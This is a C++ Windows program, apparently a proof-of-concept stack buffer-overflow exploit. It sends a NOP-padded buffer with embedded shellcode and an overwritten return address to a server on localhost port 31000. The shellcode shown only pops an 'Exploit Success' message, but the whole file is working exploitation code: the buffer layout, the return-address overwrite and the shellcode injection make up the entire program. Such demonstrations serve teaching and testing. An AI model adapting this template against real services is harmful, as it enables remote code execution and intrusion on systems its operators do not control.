#include <iostream>
#include <winsock2.h>

using namespace std;

//-----------------------------------------------------------------------------
char payload[] =
	"\xEB\x16\x58\x31\xDB\x53\x50\x50\x53\xB8\x0A\xB0\xD3\x77\xFF\xD0"
	"\x53\xB8\xFD\x98\xE5\x77\xFF\xD0\xE8\xE5\xFF\xFF\xFF\x45\x78\x70"
	"\x6C\x6F\x69\x74\x20\x53\x75\x63\x63\x73\x65\x73\x73\x20\x21\x00";

//-----------------------------------------------------------------------------
int main(int argc, char* argv[])
{
	WSAData data;
	WSAStartup(MAKEWORD(1,1),&data);

	MessageBox(NULL,"Press OK to start Exploit :)","Message",0x0);

	int cs;
	struct sockaddr_in server;

	server.sin_family			= AF_INET;
	server.sin_port				= htons(31000);
	server.sin_addr.S_un.S_addr	= inet_addr("127.0.0.1");
	memset(&server.sin_zero,0,8);

	cs = socket(AF_INET,SOCK_STREAM,0);

	if(connect(cs,(struct sockaddr*)&server,sizeof(struct sockaddr_in)) == 0 )
	{
		cout << "Connected to localhost !\n";
		
		long addr = 0x0012FBC8;

		unsigned int size = 524;
		char *buf = new char[size];

		memset(buf,0x90,size);			// NOPE THE BUFFER
		
		for(unsigned int i=0; i<sizeof(payload); i++) buf[i] = payload[i];

		*(long*)(buf+(size-4)) = addr;	// ADDRESS OF EGG TO END OF BUFFER ( OVERRIDES RET ADDR )

		send(cs, (char*)&size, 4, 0);
		send(cs, buf, size, 0);

		delete buf;
		closesocket(cs);
		cout << "Connection closed !\n";
	}
	else
	{
		cout << "Connection faild !\n";
	}


	WSACleanup();
	return 0;
}